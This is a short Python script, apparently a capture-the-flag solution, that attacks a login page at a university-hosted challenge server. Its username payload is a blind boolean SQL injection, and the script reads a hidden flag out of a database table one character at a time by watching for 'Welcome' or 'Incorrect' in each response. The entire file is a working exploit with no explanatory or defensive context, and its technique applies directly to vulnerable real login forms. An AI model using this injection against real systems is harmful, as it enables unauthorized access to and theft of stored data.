import requests
import string
letters = string.ascii_lowercase + string.ascii_uppercase + "1234567890{}_?,~!@#$%^&*()_+=[]"
URL = "http://recruit.osiris.cyber.nyu.edu:2002/auth/login"
counter = 0          # Keeps a track of the letters tried.
letter_counter = 1   # Keeps a track of which index is being leaked
final = ""           # Holds the final string retrieved

while True:
 while True:
  if counter > len(letters):
   break
  current = letters[counter]
  data = {
      "username": "-1' or substring((select binary group_concat(flag) from its_in_here)," + str(
          letter_counter) + ",1)=\"" + current + "\" -- ",
      "password": "lol",
  }
  req = requests.post(URL, data=data)
  if "Incorrect" in req.text:
   counter += 1
  elif "Welcome" in req.text:
   final += current
   letter_counter += 1
   counter = 0
   break
 print(final)